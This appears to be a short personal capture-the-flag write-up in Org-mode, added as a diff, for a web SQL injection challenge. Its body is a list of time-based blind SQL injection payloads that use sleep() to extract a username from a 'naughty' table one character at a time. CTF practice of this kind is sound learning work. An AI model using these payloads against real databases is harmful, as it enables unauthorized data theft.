@@ -1,0 +1,19 @@
+* SQLi 1
+
+** What you learn
+
+
+** Writeup
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/Projects/cybersecurity-ctf/web-501-sqli-1/WRITEUP_att
+:END:
+
+#+BEGIN_SRC sql
+' or (select if(mid(username,1,1)='e', sleep(1), 0) from naughty); #
+' or (select if(mid(username,2,1)='g', sleep(1), 0) from naughty); #
+' or (select if(mid(username,3,1)='i', sleep(1), 0) from naughty); #
+' or (select if(mid(username,4,1)='s', sleep(1), 0) from naughty); #
+' or (select if(mid(username,5,1)='c', sleep(1), 0) from naughty); #
+' or (select if(mid(username,6,1)='h', sleep(1), 0) from naughty); #
+' or (select if(mid(username,7,1)='e', sleep(1), 0) from naughty); #
+#+END_SRC
